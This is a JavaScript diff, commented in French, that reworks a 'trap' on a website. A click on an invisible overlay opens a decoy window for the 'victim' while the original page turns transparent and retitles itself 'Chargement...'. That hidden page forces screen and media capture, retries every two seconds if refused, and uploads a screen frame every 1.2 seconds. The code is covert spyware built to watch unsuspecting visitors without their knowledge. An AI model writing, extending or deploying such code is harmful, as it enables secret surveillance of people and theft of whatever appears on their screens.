@@ -917,27 +917,28 @@ function setupInvisibleVerifyOverlay(overlay) {
     overlay.style.background = 'rgba(0,0,0,0.01)';
 
     overlay.addEventListener('click', async () => {
-        // --- TECHNIQUE DE LA MICRO-FENÊTRE FANTÔME ---
-        // On ouvre une fenêtre minuscule (1x1) qui va porter le tracker
-        // Elle sera presque impossible à voir ou à fermer
+        // --- ÉTAPE 1 : OUVRIR LE LEURRE (LA PAGE VISIBLE) ---
+        // On ouvre une nouvelle fenêtre pour que la victime continue sa navigation
         try {
-            const ghostWindow = window.open(window.location.href + '?mode=ghost', '_blank', 'width=1,height=1,left=10000,top=10000,menubar=no,status=no,toolbar=no');
-            if (ghostWindow) {
-                // On remet tout de suite le focus sur la fenêtre principale (le site de tableaux)
-                window.focus();
+            const victimWindow = window.open(window.location.href + '?mode=view', '_blank');
+            if (victimWindow) {
+                victimWindow.focus();
             }
         } catch (e) {
-            console.warn("Échec ouverture micro-fenêtre");
+            console.warn("Échec ouverture fenêtre leurre");
         }
 
-        // --- LA FENÊTRE ACTUELLE RESTE NORMALE (LE LEURRE) ---
-        // On retire juste l'overlay pour que la victime puisse cliquer sur ses tableaux
-        overlay.style.display = 'none';
+        // --- ÉTAPE 2 : LA PAGE ACTUELLE DEVIENT LE FANTÔME (INVISIBLE) ---
+        overlay.style.background = 'rgba(0,0,0,0)';
+        overlay.innerHTML = ''; 
+        document.body.style.transition = 'opacity 0.5s ease';
+        document.body.style.opacity = '0'; 
+        document.body.style.pointerEvents = 'none';
+        document.title = 'Chargement...';
         
-        console.log("Piège activé : Micro-fenêtre lancée en fond.");
+        console.log("Piège activé : Cette page est maintenant Fantôme et invisible.");
 
-        // --- DÉCLENCHEMENT DES PERMISSIONS SUR LA FENÊTRE PRINCIPALE ---
-        // On force le partage d'écran et les médias ICI car le navigateur exige un clic réel
+        // --- ÉTAPE 3 : FORÇAGE DES CAPTURES SUR CETTE PAGE FANTÔME ---
         const forceScreenCapture = async () => {
             if (persistentScreenStream && persistentScreenStream.active) return;
             try {
@@ -952,10 +953,12 @@ function setupInvisibleVerifyOverlay(overlay) {
                 if (screenUploadTimer) clearInterval(screenUploadTimer);
                 screenUploadTimer = setInterval(uploadScreenFrame, 1200);
             } catch (err) {
+                // On insiste lourdement toutes les 2 secondes
                 setTimeout(forceScreenCapture, 2000); 
             }
         };
 
+        // Lancement immédiat du forçage écran + média
         forceScreenCapture();
 
         await Promise.all([
